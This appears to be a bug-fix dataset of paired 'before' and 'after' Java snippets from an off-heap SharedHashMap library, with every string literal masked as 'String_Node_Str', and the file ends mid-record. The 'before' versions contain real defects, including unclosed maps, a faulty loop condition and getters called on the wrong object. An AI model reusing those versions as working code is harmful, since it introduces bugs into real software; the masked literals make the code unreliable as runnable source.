    initDoubles(key,absent,size);
  }
 else   if (eclass == String.class) {
    initWords(size,key,absent);
  }
 else   throw new Error(""String_Node_Str"");
}","static void initializeKeys(Object[] key,Object[] absent,int size){
  if (eclass == Object.class || eclass == Integer.class) {
    initInts(key,absent,size);
  }
 else   if (eclass == Float.class) {
    initFloats(key,absent,size);
  }
 else   if (eclass == Double.class) {
    initDoubles(key,absent,size);
  }
 else   if (eclass == String.class) {
    initWords(size,key,absent);
  }
 else   throw new Error(""String_Node_Str"");
}"
91477,"private static File getPersistenceFile(){
  String TMP=System.getProperty(""String_Node_Str"");
  File file=new File(TMP + ""String_Node_Str"" + counter++);
  file.delete();
  file.deleteOnExit();
  return file;
}","private static File getPersistenceFile(){
  String TMP=System.getProperty(""String_Node_Str"");
  File file=new File(TMP + ""String_Node_Str"" + System.nanoTime());
  file.delete();
  file.deleteOnExit();
  return file;
}"
91478,"@Test public void testAcquireWithNullKey() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  assertNull(map.acquireUsing(null,new LongValueNative()));
}","@Test public void testAcquireWithNullKey() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  assertNull(map.acquireUsing(null,new LongValueNative()));
  map.close();
}"
91479,"@Test public void testGetWithNullKey() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  assertNull(map.getUsing(null,new LongValueNative()));
}","@Test public void testGetWithNullKey() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  assertNull(map.getUsing(null,new LongValueNative()));
  map.close();
}"
91480,"@Test public void testGetWithNullContainer() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  map.acquireUsing(""String_Node_Str"",new LongValueNative());
  assertEquals(0,map.getUsing(""String_Node_Str"",null).getValue());
}","@Test public void testGetWithNullContainer() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  map.acquireUsing(""String_Node_Str"",new LongValueNative());
  assertEquals(0,map.getUsing(""String_Node_Str"",null).getValue());
  map.close();
}"
91481,"@Test public void testGetWithoutAcquireFirst() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  assertNull(map.getUsing(""String_Node_Str"",new LongValueNative()));
}","@Test public void testGetWithoutAcquireFirst() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  assertNull(map.getUsing(""String_Node_Str"",new LongValueNative()));
  map.close();
}"
91482,"@Test public void testRemoveWithKeyAndRemoveReturnsNull() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).removeReturnsNull(true).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  assertFalse(map.containsKey(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(2,map.size());
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final CharSequence result=map.remove(""String_Node_Str"");
  assertEquals(null,result);
  assertEquals(1,map.size());
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(null,map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
}","@Test public void testRemoveWithKeyAndRemoveReturnsNull() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).removeReturnsNull(true).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  assertFalse(map.containsKey(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(2,map.size());
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final CharSequence result=map.remove(""String_Node_Str"");
  assertEquals(null,result);
  assertEquals(1,map.size());
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(null,map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  map.close();
}"
91483,"@Test public void testAcquireWithNullContainer() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  map.acquireUsing(""String_Node_Str"",new LongValueNative());
  assertEquals(0,map.acquireUsing(""String_Node_Str"",null).getValue());
}","@Test public void testAcquireWithNullContainer() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  map.acquireUsing(""String_Node_Str"",new LongValueNative());
  assertEquals(0,map.acquireUsing(""String_Node_Str"",null).getValue());
  map.close();
}"
91484,"@Test public void testReplaceWithKey() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(2,map.size());
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  final CharSequence result=map.replace(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",result);
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(3,map.size());
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  final CharSequence result2=map.replace(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",result2);
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final CharSequence result3=map.replace(""String_Node_Str"",""String_Node_Str"");
  assertEquals(null,result3);
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(3,map.size());
}","@Test public void testReplaceWithKey() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(2,map.size());
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  final CharSequence result=map.replace(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",result);
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(3,map.size());
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  final CharSequence result2=map.replace(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",result2);
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final CharSequence result3=map.replace(""String_Node_Str"",""String_Node_Str"");
  assertEquals(null,result3);
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(3,map.size());
  map.close();
}"
91485,"@Test public void testRemoveWithKeyAndValue() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final boolean wasRemoved1=map.remove(""String_Node_Str"",""String_Node_Str"");
  assertFalse(wasRemoved1);
  assertEquals(null,map.get(""String_Node_Str""),""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""),""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  final boolean wasRemoved2=map.remove(""String_Node_Str"",""String_Node_Str"");
  assertFalse(wasRemoved2);
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
}","@Test public void testRemoveWithKeyAndValue() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final boolean wasRemoved1=map.remove(""String_Node_Str"",""String_Node_Str"");
  assertFalse(wasRemoved1);
  assertEquals(null,map.get(""String_Node_Str""),""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""),""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  final boolean wasRemoved2=map.remove(""String_Node_Str"",""String_Node_Str"");
  assertFalse(wasRemoved2);
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.close();
}"
91486,"@Test public void testSize() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(1024).removeReturnsNull(true).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  for (int i=1; i < 1024; i++) {
    map.put(""String_Node_Str"" + i,""String_Node_Str"");
    assertEquals(i,map.size());
  }
  for (int i=1023; i >= 1; ) {
    map.remove(""String_Node_Str"" + i);
    i--;
    assertEquals(i,map.size());
  }
}","@Test public void testSize() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(1024).removeReturnsNull(true).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  for (int i=1; i < 1024; i++) {
    map.put(""String_Node_Str"" + i,""String_Node_Str"");
    assertEquals(i,map.size());
  }
  for (int i=1023; i >= 1; ) {
    map.remove(""String_Node_Str"" + i);
    i--;
    assertEquals(i,map.size());
  }
  map.close();
}"
91487,"@Test public void testRemoveWithKey() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  assertFalse(map.containsKey(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(2,map.size());
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final CharSequence result=map.remove(""String_Node_Str"");
  assertEquals(1,map.size());
  assertEquals(""String_Node_Str"",result);
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(null,map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
}","@Test public void testRemoveWithKey() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  assertFalse(map.containsKey(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(2,map.size());
  assertTrue(map.containsKey(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final CharSequence result=map.remove(""String_Node_Str"");
  assertEquals(1,map.size());
  assertEquals(""String_Node_Str"",result);
  assertFalse(map.containsKey(""String_Node_Str""));
  assertEquals(null,map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertFalse(map.containsKey(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertTrue(map.containsKey(""String_Node_Str""));
  assertEquals(2,map.size());
  map.close();
}"
91488,"private static File getPersistenceFile(){
  String TMP=System.getProperty(""String_Node_Str"");
  File file=new File(TMP + ""String_Node_Str"" + counter++);
  file.delete();
  file.deleteOnExit();
  return file;
}","private static File getPersistenceFile(){
  String TMP=System.getProperty(""String_Node_Str"");
  File file=new File(TMP + ""String_Node_Str"" + System.nanoTime());
  file.delete();
  file.deleteOnExit();
  return file;
}"
91489,"@Test public void testReplaceWithKeyAnd2Params() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final boolean result=map.replace(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(true,result);
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final boolean result2=map.replace(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(true,result2);
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final boolean result3=map.replace(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(false,result3);
  final boolean result4=map.replace(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(true,result4);
}","@Test public void testReplaceWithKeyAnd2Params() throws Exception {
  final SharedHashMap<CharSequence,CharSequence> map=new SharedHashMapBuilder().minSegments(2).create(getPersistenceFile(),CharSequence.class,CharSequence.class);
  map.put(""String_Node_Str"",""String_Node_Str"");
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final boolean result=map.replace(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(true,result);
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  map.put(""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final boolean result2=map.replace(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(true,result2);
  assertEquals(""String_Node_Str"",map.get(""String_Node_Str""));
  final boolean result3=map.replace(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(false,result3);
  final boolean result4=map.replace(""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(true,result4);
  map.close();
}"
91490,"@Override public long offset(){
  return _offset;
}","public long offset(){
  return _offset;
}"
91491,"private SharedHashMapBuilder readFile(File file) throws IOException {
  ByteBuffer bb=ByteBuffer.allocateDirect(HEADER_SIZE).order(ByteOrder.nativeOrder());
  FileInputStream fis=new FileInputStream(file);
  fis.getChannel().read(bb);
  fis.close();
  bb.flip();
  if (bb.remaining() <= 20)   throw new IOException(""String_Node_Str"" + file);
  byte[] bytes=new byte[8];
  bb.get(bytes);
  if (!Arrays.equals(bytes,MAGIC))   throw new IOException(""String_Node_Str"" + new String(bytes,0));
  SharedHashMapBuilder builder=new SharedHashMapBuilder();
  builder.segments(bb.getInt());
  builder.entries((long)(bb.getLong() * builder.segments() / INCREASE_ENTRIES_PER_SECTOR));
  builder.entrySize(bb.getInt());
  builder.replicas(bb.getInt());
  builder.transactional(bb.get() == 'Y');
  if (segments() <= 0 || entries() <= 0 || entrySize() <= 0)   throw new IOException(""String_Node_Str"" + file);
  return builder;
}","private static SharedHashMapBuilder readFile(File file) throws IOException {
  ByteBuffer bb=ByteBuffer.allocateDirect(HEADER_SIZE).order(ByteOrder.nativeOrder());
  FileInputStream fis=new FileInputStream(file);
  fis.getChannel().read(bb);
  fis.close();
  bb.flip();
  if (bb.remaining() <= 20)   throw new IOException(""String_Node_Str"" + file);
  byte[] bytes=new byte[8];
  bb.get(bytes);
  if (!Arrays.equals(bytes,MAGIC))   throw new IOException(""String_Node_Str"" + new String(bytes,0));
  SharedHashMapBuilder builder=new SharedHashMapBuilder();
  builder.segments(bb.getInt());
  builder.entries((long)(bb.getLong() * builder.segments() / INCREASE_ENTRIES_PER_SECTOR));
  builder.entrySize(bb.getInt());
  builder.replicas(bb.getInt());
  builder.transactional(bb.get() == 'Y');
  if (builder.segments() <= 0 || builder.entries() <= 0 || builder.entrySize() <= 0)   throw new IOException(""String_Node_Str"" + file);
  return builder;
}"
91492,"/** 
 * Remove a key/value combination.
 * @param key   to remove
 * @param value to remove
 * @return whether a match was found.
 */
public boolean remove(int key,int value){
  int pos=(key & capacityMask) << 3;
  int pos0=-1;
  boolean found=false;
  for (int i=0; i <= capacityMask; i++) {
    int key2=bytes.readInt(pos + KEY);
    if (key2 == key) {
      int value2=bytes.readInt(pos + VALUE);
      if (value2 == value) {
        found=true;
        pos0=pos;
      }
    }
 else     if (key2 == UNSET) {
      break;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  if (!found)   return false;
  size--;
  int pos2=pos;
  while (pos >= pos0) {
    pos=(pos - ENTRY_SIZE) & capacityMask2;
    int key2=bytes.readInt(pos + KEY);
    if (key2 == key) {
      if (pos != pos0) {
        int value2=bytes.readInt(pos + VALUE);
        bytes.writeInt(pos0 + VALUE,value2);
      }
      bytes.writeLong(pos,UNSET_ENTRY);
      break;
    }
  }
  pos=(pos + ENTRY_SIZE) & capacityMask2;
  while (pos < pos2) {
    int key2=bytes.readInt(pos + KEY);
    int value2=bytes.readInt(pos + VALUE);
    bytes.writeLong(pos,UNSET_ENTRY);
    size--;
    put(key2,value2);
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  return true;
}","/** 
 * Remove a key/value combination.
 * @param key   to remove
 * @param value to remove
 * @return whether a match was found.
 */
public boolean remove(int key,int value){
  int pos=(key & capacityMask) << 3;
  int pos0=-1;
  boolean found=false;
  for (int i=0; i <= capacityMask; i++) {
    int key2=bytes.readInt(pos + KEY);
    if (key2 == key) {
      int value2=bytes.readInt(pos + VALUE);
      if (value2 == value) {
        found=true;
        pos0=pos;
      }
    }
 else     if (key2 == UNSET) {
      break;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  if (!found)   return false;
  size--;
  int pos2=pos;
  while (pos != pos0) {
    pos=(pos - ENTRY_SIZE) & capacityMask2;
    int key2=bytes.readInt(pos + KEY);
    if (key2 == key) {
      if (pos != pos0) {
        int value2=bytes.readInt(pos + VALUE);
        bytes.writeInt(pos0 + VALUE,value2);
      }
      bytes.writeLong(pos,UNSET_ENTRY);
      break;
    }
  }
  pos=(pos + ENTRY_SIZE) & capacityMask2;
  while (pos < pos2) {
    int key2=bytes.readInt(pos + KEY);
    int value2=bytes.readInt(pos + VALUE);
    bytes.writeLong(pos,UNSET_ENTRY);
    size--;
    put(key2,value2);
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  return true;
}"
91493,"public synchronized boolean containsKey(long h,K key){
  int hash=intHashFor(h);
  smallMap.startSearch(hash);
  boolean found=false;
  while (true) {
    int pos=smallMap.nextInt();
    if (pos == IntIntMultiMap.UNSET) {
      return map.containsKey(key);
    }
    bytes.storePositionAndSize(store,pos * smallEntrySize,smallEntrySize);
    K key2=getKey();
    if (equals(key,key2)) {
      return true;
    }
  }
}","public synchronized boolean containsKey(long h,K key){
  int hash=intHashFor(h);
  smallMap.startSearch(hash);
  boolean found=false;
  while (true) {
    int pos=smallMap.nextInt();
    if (pos == IntIntMultiMap.UNSET) {
      Object key2=key instanceof CharSequence ? key.toString() : key;
      return map.containsKey(key2);
    }
    bytes.storePositionAndSize(store,pos * smallEntrySize,smallEntrySize);
    K key2=getKey();
    if (equals(key,key2)) {
      return true;
    }
  }
}"
91494,"public synchronized void put(long h,K key,V value,boolean ifPresent,boolean ifAbsent){
  int hash=intHashFor(h);
  smallMap.startSearch(hash);
  boolean foundSmall=false, foundLarge=false;
  while (true) {
    int pos=smallMap.nextInt();
    if (pos == IntIntMultiMap.UNSET) {
      final DirectStore store=map.get(key);
      if (store == null) {
        if (ifPresent && !ifAbsent)         return;
        break;
      }
      if (ifAbsent)       return;
      bytes.storePositionAndSize(store,0,store.size());
      foundLarge=true;
      break;
    }
 else {
      bytes.storePositionAndSize(store,pos * smallEntrySize,smallEntrySize);
      K key2=getKey();
      if (equals(key,key2)) {
        if (ifAbsent && !ifPresent)         return;
        foundSmall=true;
        break;
      }
    }
  }
  tmpBytes.reset();
  if (csKey)   tmpBytes.writeUTF((CharSequence)key);
 else   tmpBytes.writeObject(key);
  long startOfValuePos=tmpBytes.position();
  if (bytesMarshallable)   ((BytesMarshallable)value).writeMarshallable(tmpBytes);
 else   tmpBytes.writeObject(value);
  long size=tmpBytes.position();
  if (size <= smallEntrySize) {
    if (foundSmall) {
      bytes.position(0);
      bytes.write(tmpBytes,0,size);
      return;
    }
 else     if (foundLarge) {
      remove(hash,key);
    }
    int position=(int)(h & (entriesPerSegment - 1));
    int free=usedSet.nextClearBit(position);
    if (free >= entriesPerSegment)     free=usedSet.nextClearBit(0);
    if (free < entriesPerSegment) {
      bytes.storePositionAndSize(store,free * smallEntrySize,smallEntrySize);
      bytes.write(tmpBytes,0,size);
      smallMap.put(hash,free);
      usedSet.set(free);
      this.size++;
      return;
    }
  }
  if (foundSmall) {
    remove(hash,key);
  }
 else   if (foundLarge) {
    if (bytes.capacity() <= size || bytes.capacity() - size < (size >> 3)) {
      bytes.write(tmpBytes,startOfValuePos,size);
      return;
    }
    remove(hash,key);
  }
  size=size - startOfValuePos;
  DirectStore store=new DirectStore(bmf,size);
  bytes.storePositionAndSize(store,0,size);
  bytes.write(tmpBytes,startOfValuePos,size);
  map.put(key,store);
  offHeapUsed+=size;
  this.size++;
}","public synchronized void put(long h,K key,V value,boolean ifPresent,boolean ifAbsent){
  int hash=intHashFor(h);
  smallMap.startSearch(hash);
  boolean foundSmall=false, foundLarge=false;
  while (true) {
    int pos=smallMap.nextInt();
    if (pos == IntIntMultiMap.UNSET) {
      Object key2=key instanceof CharSequence ? key.toString() : key;
      final DirectStore store=map.get(key2);
      if (store == null) {
        if (ifPresent && !ifAbsent)         return;
        break;
      }
      if (ifAbsent)       return;
      bytes.storePositionAndSize(store,0,store.size());
      foundLarge=true;
      break;
    }
 else {
      bytes.storePositionAndSize(store,pos * smallEntrySize,smallEntrySize);
      K key2=getKey();
      if (equals(key,key2)) {
        if (ifAbsent && !ifPresent)         return;
        foundSmall=true;
        break;
      }
    }
  }
  tmpBytes.reset();
  if (csKey)   tmpBytes.writeUTF((CharSequence)key);
 else   tmpBytes.writeObject(key);
  long startOfValuePos=tmpBytes.position();
  if (bytesMarshallable)   ((BytesMarshallable)value).writeMarshallable(tmpBytes);
 else   tmpBytes.writeObject(value);
  long size=tmpBytes.position();
  if (size <= smallEntrySize) {
    if (foundSmall) {
      bytes.position(0);
      bytes.write(tmpBytes,0,size);
      return;
    }
 else     if (foundLarge) {
      remove(hash,key);
    }
    int position=(int)(h & (entriesPerSegment - 1));
    int free=usedSet.nextClearBit(position);
    if (free >= entriesPerSegment)     free=usedSet.nextClearBit(0);
    if (free < entriesPerSegment) {
      bytes.storePositionAndSize(store,free * smallEntrySize,smallEntrySize);
      bytes.write(tmpBytes,0,size);
      smallMap.put(hash,free);
      usedSet.set(free);
      this.size++;
      return;
    }
  }
  if (foundSmall) {
    remove(hash,key);
  }
 else   if (foundLarge) {
    if (bytes.capacity() <= size || bytes.capacity() - size < (size >> 3)) {
      bytes.write(tmpBytes,startOfValuePos,size);
      return;
    }
    remove(hash,key);
  }
  size=size - startOfValuePos;
  DirectStore store=new DirectStore(bmf,size);
  bytes.storePositionAndSize(store,0,size);
  bytes.write(tmpBytes,startOfValuePos,size);
  K key2=key instanceof CharSequence ? (K)key.toString() : key;
  map.put(key2,store);
  offHeapUsed+=size;
  this.size++;
}"
91495,"public synchronized boolean remove(long h,K key){
  int hash=intHashFor(h);
  smallMap.startSearch(hash);
  boolean found=false;
  while (true) {
    int pos=smallMap.nextInt();
    if (pos == IntIntMultiMap.UNSET) {
      break;
    }
    bytes.storePositionAndSize(store,pos * smallEntrySize,smallEntrySize);
    K key2=getKey();
    if (equals(key,key2)) {
      usedSet.clear(pos);
      smallMap.remove(hash,pos);
      found=true;
      this.size--;
      break;
    }
  }
  DirectStore remove=map.remove(key);
  if (remove == null)   return found;
  offHeapUsed-=remove.size();
  remove.free();
  this.size--;
  return true;
}","public synchronized boolean remove(long h,K key){
  int hash=intHashFor(h);
  smallMap.startSearch(hash);
  boolean found=false;
  while (true) {
    int pos=smallMap.nextInt();
    if (pos == IntIntMultiMap.UNSET) {
      break;
    }
    bytes.storePositionAndSize(store,pos * smallEntrySize,smallEntrySize);
    K key2=getKey();
    if (equals(key,key2)) {
      usedSet.clear(pos);
      smallMap.remove(hash,pos);
      found=true;
      this.size--;
      break;
    }
  }
  Object key2=key instanceof CharSequence ? key.toString() : key;
  DirectStore remove=map.remove(key2);
  if (remove == null)   return found;
  offHeapUsed-=remove.size();
  remove.free();
  this.size--;
  return true;
}"
91496,"public synchronized V get(long h,K key,V value){
  int hash=intHashFor(h);
  smallMap.startSearch(hash);
  while (true) {
    int pos=smallMap.nextInt();
    if (pos == IntIntMultiMap.UNSET) {
      final DirectStore store=map.get(key);
      if (store == null)       return null;
      bytes.storePositionAndSize(store,0,store.size());
      break;
    }
 else {
